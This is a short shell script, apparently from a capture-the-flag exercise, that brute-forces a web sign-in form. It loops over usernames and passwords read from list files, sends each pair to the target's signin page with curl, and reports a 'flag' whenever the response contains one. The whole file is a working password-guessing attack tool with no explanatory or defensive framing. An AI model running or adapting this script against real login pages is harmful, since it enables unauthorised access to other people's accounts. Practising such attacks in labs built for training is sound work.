#!/bin/sh
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

loginList=$(cat loginList)
passwordList=$(cat passwordList)
url=$1

for login in $loginList; do
  for password in $passwordList; do
    echo "${NC}*****************************************"
    echo "${NC}Try login: $login and password: $password"
    res=$(curl -s "http://$url/?page=signin&username=$login&password=$password&Login=Login" | grep "flag" | awk '{print $6}')
    if [ -z "$res" ]; then
      echo "${RED}FAILURE"
    else
      echo "${GREEN}SUCCESS"
      echo "${YELLOW}Flag: $res"
    fi
  done
done
